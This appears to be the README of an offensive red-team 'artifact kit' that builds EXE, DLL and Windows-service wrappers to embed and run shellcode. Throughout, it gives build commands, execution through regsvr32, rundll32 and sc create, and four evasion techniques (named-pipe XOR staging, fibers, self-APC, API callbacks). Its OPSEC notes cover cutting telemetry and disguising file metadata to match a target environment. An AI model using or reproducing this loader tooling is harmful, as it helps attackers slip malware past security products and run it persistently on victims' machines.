# Starburst Arsenal Kit - Artifact Kit

Standalone C source files for building EXE, DLL, and Windows Service wrappers that embed and execute Starburst shellcode. Each wrapper pairs with a **bypass technique** that controls how shellcode is staged and executed, providing flexibility for evasion.

## Architecture

```
artifact-kit/
  src/
    main_exe.c       - EXE wrapper (WinMain entry)
    main_dll.c        - DLL wrapper (DllMain + exports)
    main_svc.c        - Windows Service wrapper
  bypass/
    bypass_pipe.c     - Named-pipe self-injection (XOR decode over pipe)
    bypass_fiber.c    - Fiber-based execution (no thread creation)
    bypass_apc_self.c - Self-APC injection (NtTestAlert trigger)
    bypass_callback.c - Windows callback execution (EnumWindows, etc.)
  templates/
    resource.rc       - Version info, icon, and manifest template
```

## How Shellcode Embedding Works

Shellcode is linked into the final binary in one of two ways:

1. **Object file linkage** -- Convert raw shellcode to a C array with `xxd -i` or a similar tool, compile it into an object, and link it alongside the wrapper. The wrappers reference:
   ```c
   extern unsigned char shellcode[];
   extern unsigned int  shellcode_len;
   ```

2. **Resource section (.rsrc)** -- Embed shellcode as a custom resource using `resource.rc`. The wrapper calls `FindResource` / `LoadResource` / `LockResource` at runtime. This keeps shellcode out of `.data` / `.rdata` sections.

### Generating a shellcode object file

```bash
# From raw shellcode binary:
xxd -i payload.bin > shellcode.c
# Produces: unsigned char payload_bin[] = { ... }; unsigned int payload_bin_len = ...;
# Rename the symbols to shellcode / shellcode_len, then compile:
x86_64-w64-mingw32-gcc -c shellcode.c -o shellcode.o
```

## Build Commands

All examples use MinGW cross-compilation. Substitute `cl.exe` flags for MSVC.

### EXE Wrapper

```bash
# With named-pipe bypass:
x86_64-w64-mingw32-gcc -O2 -s -o starburst.exe \
    src/main_exe.c bypass/bypass_pipe.c shellcode.o \
    -lkernel32 -luser32 -ladvapi32 \
    -Wl,--subsystem,windows -mwindows

# With resource file (MSVC):
rc /fo resource.res templates/resource.rc
cl /O2 src/main_exe.c bypass/bypass_pipe.c shellcode.obj resource.res \
    /link /SUBSYSTEM:WINDOWS kernel32.lib user32.lib advapi32.lib
```

### DLL Wrapper

```bash
x86_64-w64-mingw32-gcc -shared -O2 -s -o starburst.dll \
    src/main_dll.c bypass/bypass_fiber.c shellcode.o \
    -lkernel32 -luser32 -ladvapi32

# Execute via regsvr32:
#   regsvr32 /s starburst.dll
# Execute via rundll32:
#   rundll32 starburst.dll,DllRegisterServer
```

### Service Wrapper

```bash
x86_64-w64-mingw32-gcc -O2 -s -o starburst_svc.exe \
    src/main_svc.c bypass/bypass_apc_self.c shellcode.o \
    -lkernel32 -ladvapi32

# Install and start:
#   sc create StarburstSvc binPath= "C:\path\starburst_svc.exe"
#   sc start StarburstSvc
```

## Bypass Techniques

| Technique | File | Description | OPSEC Notes |
|-----------|------|-------------|-------------|
| Named Pipe | `bypass_pipe.c` | XOR-encoded shellcode written to a random named pipe by a server thread; client thread reads and decodes. Shellcode never exists in decoded form in the original PE image. | Avoids static decoded shellcode in memory; pipe name is random per execution. |
| Fiber | `bypass_fiber.c` | Converts the current thread to a fiber, creates a new fiber with shellcode as the entry point, and switches to it. | No `CreateThread` call; fiber execution generates fewer telemetry events than threads. |
| Self-APC | `bypass_apc_self.c` | Queues a user APC to the current thread and flushes it with `NtTestAlert` or `SleepEx(0, TRUE)`. | No thread creation or remote injection APIs; execution stays entirely within the current thread. |
| Callback | `bypass_callback.c` | Passes the shellcode address as a callback to legitimate Windows APIs (`EnumWindows`, `CreateTimerQueueTimer`, etc.). | Execution flow looks like normal callback invocation; blends with standard API usage patterns. |

## Customizing resource.rc

Edit `templates/resource.rc` to set:

- **Company name, product name, description** -- Shown in file properties dialog.
- **Icon** -- Replace the icon path or comment out the `IDI_ICON1` line.
- **UAC manifest** -- Set `requestedExecutionLevel` to `asInvoker`, `highestAvailable`, or `requireAdministrator`.
- **DPI awareness** -- Enabled by default for visual consistency.

## Mixing Bypass Techniques

Each bypass file exports the same interface:

```c
void execute_shellcode(unsigned char* shellcode, unsigned int shellcode_len);
```

Swap bypass modules at link time without modifying the wrapper source. For example, switch the EXE from pipe bypass to callback bypass by changing which `.c` file is compiled in.

## OPSEC Considerations

- All bypass techniques allocate memory with `PAGE_READWRITE` first, copy shellcode, then change protection to `PAGE_EXECUTE_READ`. This avoids `RWX` memory allocations.
- Shellcode is never stored decoded in the binary's static sections when using the pipe bypass.
- No bypass technique uses `CreateRemoteThread` or writes to another process.
- The service wrapper handles `SERVICE_CONTROL_STOP` cleanly to avoid suspicious service crashes.
- Resource metadata in `resource.rc` should be customized to match the target environment.
